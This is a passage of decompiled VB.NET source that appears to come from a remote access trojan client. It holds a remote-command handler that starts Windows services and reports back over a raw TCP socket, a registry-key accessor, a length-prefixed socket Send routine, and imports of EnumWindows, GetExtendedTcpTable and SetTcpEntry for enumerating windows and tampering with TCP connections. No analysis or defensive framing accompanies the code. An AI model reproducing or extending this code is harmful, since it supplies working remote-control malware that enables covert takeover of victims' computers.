						ElseIf Operators.CompareString(left8, "#", False) = 0 Then
							For Each serviceController4 As ServiceController In ServiceController.GetServices()
								Dim num54 As Integer = 3
								Dim num55 As Integer = array.Length - 1
								For num56 As Integer = num54 To num55
									If Operators.CompareString(serviceController4.ServiceName.ToLower(), array(num56).ToLower(), False) = 0 Then
										Try
											serviceController4.Start()
											Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, "Started ", serviceController4.DisplayName }))
											Exit Try
										Catch ex29 As Exception
											Me.Send(String.Concat(New String() { "FM", Me.Y, "ER", Me.Y, array(2), Me.Y, ex29.Message }))
											Exit Try
										End Try
									End If
								Next
							Next
						End If
					End If
				End If
			Catch ex30 As Exception
				Try
					Me.Send(String.Concat(New String() { "Ex", Me.Y, array(1), ":", array(2), "--> ", ex30.Message }))
				Catch ex31 As Exception
				End Try
			End Try
		End Sub

		' Token: 0x06000019 RID: 25
		Private Declare Auto Function EnumWindows Lib "user32.dll" (lpEnumFunc As A.EnumWindowsProc, lParam As IntPtr) As Boolean

		' Token: 0x0600001A RID: 26 RVA: 0x00005130 File Offset: 0x00003330
		Public Function GetKey(key As String, write As Boolean) As RegistryKey
			Dim registryKey As RegistryKey = Nothing
			Dim left As String = Strings.Split(key, "\", -1, CompareMethod.Binary)(0)
			If Operators.CompareString(left, Me.F.Registry.ClassesRoot.Name, False) = 0 Then
				registryKey = Me.F.Registry.ClassesRoot
			ElseIf Operators.CompareString(left, Me.F.Registry.CurrentUser.Name, False) = 0 Then
				registryKey = Me.F.Registry.CurrentUser
			ElseIf Operators.CompareString(left, Me.F.Registry.LocalMachine.Name, False) = 0 Then
				registryKey = Me.F.Registry.LocalMachine
			ElseIf Operators.CompareString(left, Me.F.Registry.Users.Name, False) = 0 Then
				registryKey = Me.F.Registry.Users
			End If
			Return registryKey.OpenSubKey(key.Remove(0, registryKey.Name.Length + 1), write)
		End Function

		' Token: 0x0600001B RID: 27 RVA: 0x00005234 File Offset: 0x00003434
		Public Sub Clear()
			Me.CN = False
			Me.C = Nothing
			Try
				If Me.Pro IsNot Nothing Then
					Me.Pro.Kill()
					Me.Pro = Nothing
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600001C RID: 28 RVA: 0x0000528C File Offset: 0x0000348C
		Public Sub Send(b As Byte())
			Try
				Dim c As TcpClient = Me.C
				SyncLock c
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = Conversions.ToString(b.Length) + vbNullChar
					Dim array As Byte() = Me.SB(text)
					memoryStream.Write(array, 0, array.Length)
					memoryStream.Write(b, 0, b.Length)
					Me.C.Client.Send(memoryStream.ToArray(), 0, CInt(memoryStream.Length), SocketFlags.None)
					memoryStream.Dispose()
				End SyncLock
			Catch ex As Exception
				Me.Clear()
			End Try
		End Sub

		' Token: 0x0600001D RID: 29 RVA: 0x00005340 File Offset: 0x00003540
		Public Sub Send(S As String)
			Me.Send(Me.SB(S))
		End Sub

		' Token: 0x0600001E RID: 30
		Private Declare Function SetTcpEntry Lib "iphlpapi.dll" (pTcprow As IntPtr) As Integer

		' Token: 0x0600001F RID: 31
		Private Declare Function GetExtendedTcpTable Lib "iphlpapi.dll" (pTcpTable As IntPtr, ByRef dwOutBufLen As Integer, sort As Boolean, ipVersion As Integer, tblClass As A.TCP_TABLE_CLASS, reserved As Integer) As UInteger

		' Token: 0x06000020 RID: 32 RVA: 0x00005350 File Offset: 0x00003550
		Public Function GetAllTcpConnections() As A.MIB_TCPROW_OWNER_PID()
			Dim ipVersion As Integer = 2
            Dim cb As Integer = 0
            Dim intPtr As IntPtr = Marshal.AllocHGlobal(cb)
            Dim extendedTcpTable As UInteger = A.GetExtendedTcpTable(IntPtr.Zero, cb, True, ipVersion, A.TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL, 0)

            Dim array As A.MIB_TCPROW_OWNER_PID()
			Try
				extendedTcpTable = A.GetExtendedTcpTable(intPtr, cb, True, ipVersion, A.TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL, 0)
				If CULng(extendedTcpTable) <> 0UL Then
					Return Nothing
				End If
				Dim obj As Object = Marshal.PtrToStructure(intPtr, GetType(A.MIB_TCPTABLE_OWNER_PID))
				Dim mib_TCPTABLE_OWNER_PID2 As A.MIB_TCPTABLE_OWNER_PID
				Dim mib_TCPTABLE_OWNER_PID As A.MIB_TCPTABLE_OWNER_PID = If((obj IsNot Nothing), CType(obj, A.MIB_TCPTABLE_OWNER_PID), mib_TCPTABLE_OWNER_PID2)
				Dim intPtr2 As IntPtr = CType((CLng(intPtr) + CLng(Marshal.SizeOf(mib_TCPTABLE_OWNER_PID.dwNumEntries))), IntPtr)
				array = New A.MIB_TCPROW_OWNER_PID(CInt((CULng(mib_TCPTABLE_OWNER_PID.dwNumEntries) - 1UL)) + 1 - 1) {}
				Dim num As Integer = 0
				Dim num2 As Integer = CInt((CULng(mib_TCPTABLE_OWNER_PID.dwNumEntries) - 1UL))
				For i As Integer = num To num2
					Dim obj2 As Object = Marshal.PtrToStructure(intPtr2, GetType(A.MIB_TCPROW_OWNER_PID))
					Dim mib_TCPROW_OWNER_PID2 As A.MIB_TCPROW_OWNER_PID
					Dim mib_TCPROW_OWNER_PID As A.MIB_TCPROW_OWNER_PID = If((obj2 IsNot Nothing), CType(obj2, A.MIB_TCPROW_OWNER_PID), mib_TCPROW_OWNER_PID2)
					array(i) = mib_TCPROW_OWNER_PID
					intPtr2 = CType((CLng(intPtr2) + CLng(Marshal.SizeOf(mib_TCPROW_OWNER_PID))), IntPtr)
				Next
			Finally
				Marshal.FreeHGlobal(intPtr)
			End Try
			Return array
		End Function

		' Token: 0x04000006 RID: 6
		Public H As String

		' Token: 0x04000007 RID: 7
		Public P As Integer

		' Token: 0x04000008 RID: 8
		Public CN As Boolean

		' Token: 0x04000009 RID: 9
		Public Y As String

		' Token: 0x0400000A RID: 10
		Public C As TcpClient

		' Token: 0x0400000B RID: 11
		Private Pro As Process

		' Token: 0x0400000C RID: 12
		Public F As Computer

		' Token: 0x02000008 RID: 8
		' (Invoke) Token: 0x06000025 RID: 37
		Private Delegate Function EnumWindowsProc(hWnd As IntPtr, ByRef lParam As IntPtr) As Boolean

		' Token: 0x02000009 RID: 9
		Public Structure MIB_TCPROW_OWNER_PID
			' Token: 0x0400000D RID: 13
			Public state As UInteger

			' Token: 0x0400000E RID: 14
			Public LA As UInteger

			' Token: 0x0400000F RID: 15
			Public l1 As Byte

			' Token: 0x04000010 RID: 16
			Public l2 As Byte

			' Token: 0x04000011 RID: 17
			Public l3 As Byte

			' Token: 0x04000012 RID: 18
			Public l4 As Byte

			' Token: 0x04000013 RID: 19
			Public RA As UInteger

			' Token: 0x04000014 RID: 20
			Public R1 As Byte

			' Token: 0x04000015 RID: 21
			Public R2 As Byte

			' Token: 0x04000016 RID: 22
			Public R3 As Byte

			' Token: 0x04000017 RID: 23
			Public R4 As Byte

			' Token: 0x04000018 RID: 24
			Public P As Integer
		End Structure

		' Token: 0x0200000A RID: 10
		Public Structure MIB_TCPTABLE_OWNER_PID
			' Token: 0x04000019 RID: 25
			Public dwNumEntries As UInteger

			' Token: 0x0400001A RID: 26
			Private table As A.MIB_TCPROW_OWNER_PID
		End Structure

		' Token: 0x0200000B RID: 11
		Public Enum TCP_TABLE_CLASS
			' Token: 0x0400001C RID: 28
			TCP_TABLE_BASIC_LISTENER
			' Token: 0x0400001D RID: 29
			TCP_TABLE_BASIC_CONNECTIONS
			' Token: 0x0400001E RID: 30
			TCP_TABLE_BASIC_ALL
			' Token: 0x0400001F RID: 31
			TCP_TABLE_OWNER_PID_LISTENER
			' Token: 0x04000020 RID: 32
			TCP_TABLE_OWNER_PID_CONNECTIONS
			' Token: 0x04000021 RID: 33
			TCP_TABLE_OWNER_PID_ALL
			' Token: 0x04000022 RID: 34
			TCP_TABLE_OWNER_MODULE_LISTENER
			' Token: 0x04000023 RID: 35
			TCP_TABLE_OWNER_MODULE_CONNECTIONS
			' Token: 0x04000024 RID: 36
			TCP_TABLE_OWNER_MODULE_ALL
		End Enum
	End Class
End Namespace
